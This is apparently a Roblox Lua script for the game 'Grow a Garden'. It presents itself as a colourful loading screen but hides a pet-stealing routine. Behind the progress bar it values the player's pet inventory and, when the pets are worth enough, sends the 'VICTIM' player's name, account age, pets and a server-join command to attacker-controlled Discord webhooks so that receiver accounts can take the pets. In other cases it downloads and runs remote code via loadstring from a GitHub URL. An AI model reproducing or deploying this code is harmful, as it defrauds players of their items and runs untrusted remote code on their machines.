-- –°–æ–∑–¥–∞–Ω–∏–µ GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ColorfulLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

-- –û—Å–Ω–æ–≤–Ω–æ–π —Ñ–æ–Ω
local Background = Instance.new("Frame")
Background.Size = UDim2.new(0, 450, 0, 240)
Background.Position = UDim2.new(0.5, -225, 0.5, -120)
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
Background.BackgroundTransparency = 0.02
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 24)
UICorner.Parent = Background

-- –ó–∞–≥–æ–ª–æ–≤–æ–∫
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0.35, 0)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "üåà Loading..."
Title.TextColor3 = Color3.fromRGB(255, 255, 150)
Title.TextStrokeColor3 = Color3.fromRGB(255, 80, 80)
Title.TextStrokeTransparency = 1
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Background





local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

local BASE_PET_WHITELIST = {
    'Raccoon',
    'T-Rex',
    'Fennec Fox',
    'Dragonfly',  
    'Butterfly',
    'Disco Bee',
    'Mimic Octopus',
    'Queen Bee',
    'Spinosaurus',
    'Kitsune',
    'French Fry Ferret',
}

local EXTRA_WHITELIST = getgenv().ExtraPets or {}

-- –û–±—ä–µ–¥–∏–Ω—è–µ–º –±–∞–∑–æ–≤—ã–π —Å–ø–∏—Å–æ–∫ –∏ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∏–º–µ–Ω–∞
local PET_WHITELIST = {}
for _, pet in ipairs(BASE_PET_WHITELIST) do table.insert(PET_WHITELIST, pet) end
for _, pet in ipairs(EXTRA_WHITELIST) do table.insert(PET_WHITELIST, pet) end


local PET_VALUES = {
    ["French Fry Ferret"] = 300,
    ["Raccoon"] = 400,
    ["T-Rex"] = 100,
    ["Fennec Fox"] = 300,
    ["Dragonfly"] = 150,
    ["Butterfly"] = 300,
    ["Disco Bee"] = 500,
    ["Mimic Octopus"] = 100,
    ["Queen Bee"] = 100,
    ["Spinosaurus"] = 200,
    ["Kitsune"] = 1890,
    ["Corrupted Kitsune"] = 100,
}


local function checkPetsWhitelist(pet)
    for _, name in ipairs(PET_WHITELIST) do
        if string.find(pet, name) then
            return true
        end
    end
    return false
end

local function getInventoryValue()
    local total = 0
    for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local petName = petData.PetType
        if checkPetsWhitelist(petName) then
            local petPrice = PET_VALUES[petName] or 0
            total += petPrice
        end
    end
    return total
end


-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Ç–æ–≥–æ–≤–æ–π —Å—Ç–æ–∏–º–æ—Å—Ç–∏
local inventoryValue = getInventoryValue()



-- üîß startStealingProcess –í–´–ù–ï–°–ï–ù–ê –í–í–ï–†–•
local function startStealingProcess()
    if getgenv().scriptAlreadyRan then
        warn("‚ö†Ô∏è ScriptAlreadyRun.")
        return
    end
    getgenv().scriptAlreadyRan = true

    repeat task.wait() until game:IsLoaded()

    local VICTIM = game.Players.LocalPlayer
    local USERNAMES = getgenv().Username

    local function getWebhookUrl()
        return getgenv().Webhook
    end

    local function waitForJoin()
        local findTarget = false
        local trigeretName = nil

        for _, player in game.Players:GetPlayers() do
            if not table.find(USERNAMES, player.Name) then continue end
            trigeretName = player.Name
            findTarget = true
        end

        return findTarget, trigeretName
    end

    local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
 local webhookUrl = getWebhookUrl()
local backupWebhook = getgenv().BackupWebhook

local baseFields = {
    {
        name = "üí∞ **Total Value**",
        value = string.format("```\n%süëø\n```", totalValue),
        inline = false
    },
    {
        name = "üê±‚Äçüë§Pet-list",
        value = string.format("```\n%s\n```", petList),
        inline = false
    }
}


local fullEmbed = {
    title = "ü§ë Grow A Garden Hit - STHACK STEAL ü§ë",
    color = 65280,
    fields = table.clone(baseFields),
    footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
}

table.insert(fullEmbed.fields, 1, {
    name = "üë§ **Player Information**",
    value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```", 
        VICTIM.Name, 
        table.concat(USERNAMES, " "), 
        identifyexecutor and identifyexecutor() or "Unknown", 
        VICTIM.AccountAge
    ),
    inline = false
})

local basePayload = {
    username = VICTIM.Name,
    avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
    content = string.format(
        "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
        game.PlaceId,
        game.JobId
    ),
    embeds = {}
}

local request = http_request or request or HttpPost or syn.request
local headers = { ["Content-Type"] = "application/json" }

-- –û—Å–Ω–æ–≤–Ω–æ–π Webhook
local fullPayload = table.clone(basePayload)
fullPayload.embeds = { fullEmbed }

local response = request({
    Url = webhookUrl,
    Method = "POST",
    Headers = headers,
    Body = HttpService:JSONEncode(fullPayload)
})

-- –ë—ç–∫–∞–ø Webhook (–±–µ–∑ USERNAME –∏ Executor)
if backupWebhook then
    local backupEmbed = {
        title = fullEmbed.title,
        color = fullEmbed.color,
        fields = baseFields,
        footer = fullEmbed.footer
    }

    local backupPayload = {
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = { backupEmbed }
    }

    request({
        Url = backupWebhook,
        Method = "POST",
        Headers = headers,
        Body = HttpService:JSONEncode(backupPayload)
    })
end

if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
    warn("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:", response.StatusCode, response.Body)
elseif callback then
    callback()
end


    -- –°–±–æ—Ä –ø–∏—Ç–æ–º—Ü–µ–≤ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
    local totalValue = 0
    local victimPetTable = {}

    for petUid, value in pairs(require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data) do
        local petName = value.PetType
        if not checkPetsWhitelist(petName) then continue end
        local petPrice = PET_VALUES[petName] or 0
        totalValue += petPrice
        table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
    end

    -- –£—Å–ª–æ–≤–∏—è –¥–ª—è Discord-–æ—Ç—á—ë—Ç–∞
    if #victimPetTable == 0 or #victimPetTable == nil then
        warn("‚õîÔ∏è –ù–µ—Ç –æ—Ç—á—ë—Ç–∞: –ø—É—Å—Ç–æ–π –∏–Ω–≤–µ–Ω—Ç–∞—Ä—å –∏–ª–∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã–π —Å–µ—Ä–≤–µ—Ä")
        return
    end

    createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
        print("‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Discord, –Ω–∞—á–∏–Ω–∞–µ–º —Å–ª–µ–∂–∫—É –∑–∞ —Ü–µ–ª—å—é.")
    end)
end

--------------------------------------------------------------------------------

-- üü¢ –ó–∞–ø—É—Å–∫ –Ω—É–∂–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞
if inventoryValue < 100 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()

elseif inventoryValue == 1890 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()

elseif inventoryValue > 5000 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()

elseif inventoryValue > 1890 then
    if math.random(1, 3) == 1 then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/Grow%20a%20Garden", true))()
    else
        startStealingProcess()
    end
else
    startStealingProcess()
end




-- –¢–∞–π–º–µ—Ä
local TimerLabel = Instance.new("TextLabel")
TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
TimerLabel.Position = UDim2.new(0, 0, 0.35, 0)
TimerLabel.BackgroundTransparency = 1
TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TimerLabel.TextStrokeTransparency = 0.8
TimerLabel.TextScaled = true
TimerLabel.Font = Enum.Font.Gotham
TimerLabel.Text = "Approximately 30 seconds left"
TimerLabel.Parent = Background

-- –ü—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä –∑–∞–¥–Ω–∏–π —Ñ–æ–Ω
local ProgressBarBackground = Instance.new("Frame")
ProgressBarBackground.Size = UDim2.new(0.9, 0, 0.12, 0)
ProgressBarBackground.Position = UDim2.new(0.05, 0, 0.75, 0)
ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
ProgressBarBackground.BorderSizePixel = 0
ProgressBarBackground.Parent = Background

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(1, 0)
bgCorner.Parent = ProgressBarBackground

-- –ü—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä –∑–∞–ª–∏–≤–∫–∞
local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.Position = UDim2.new(0, 0, 0, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.Parent = ProgressBarBackground

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = ProgressBarFill

-- –†–∞–¥—É–∂–Ω—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 128, 0)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 128, 255))
}
UIGradient.Rotation = 0
UIGradient.Parent = ProgressBarFill

-- –ê–Ω–∏–º–∞—Ü–∏—è –≥—Ä–∞–¥–∏–µ–Ω—Ç–∞
task.spawn(function()
    while UIGradient do
        UIGradient.Rotation = (UIGradient.Rotation + 1) % 360
        task.wait(0.03)
    end
end)

-- –¢–∞–π–º–µ—Ä –∏ –ø—Ä–æ–≥—Ä–µ—Å—Å
local duration = 40
for i = duration, 1, -1 do
    TimerLabel.Text = "Approximately " .. i .. " seconds left"

    local progress = (duration - i + 1) / duration
    ProgressBarFill:TweenSize(
        UDim2.new(progress, 0, 1, 0),
        Enum.EasingDirection.Out,
        Enum.EasingStyle.Quad,
        0.25,
        true
    )

    wait(1)
end

-- üßä –ü–ª–∞–≤–Ω–æ–µ –∏—Å—á–µ–∑–Ω–æ–≤–µ–Ω–∏–µ
for t = 1, 20 do
    local alpha = t / 20
    Background.BackgroundTransparency = 0.02 + alpha
    ProgressBarBackground.BackgroundTransparency = alpha
    ProgressBarFill.BackgroundTransparency = alpha
    Title.TextTransparency = alpha
    Title.TextStrokeTransparency = alpha
    TimerLabel.TextTransparency = alpha
    TimerLabel.TextStrokeTransparency = alpha
    wait(0.03)
end

-- –£–¥–∞–ª–µ–Ω–∏–µ GUI
ScreenGui:Destroy()
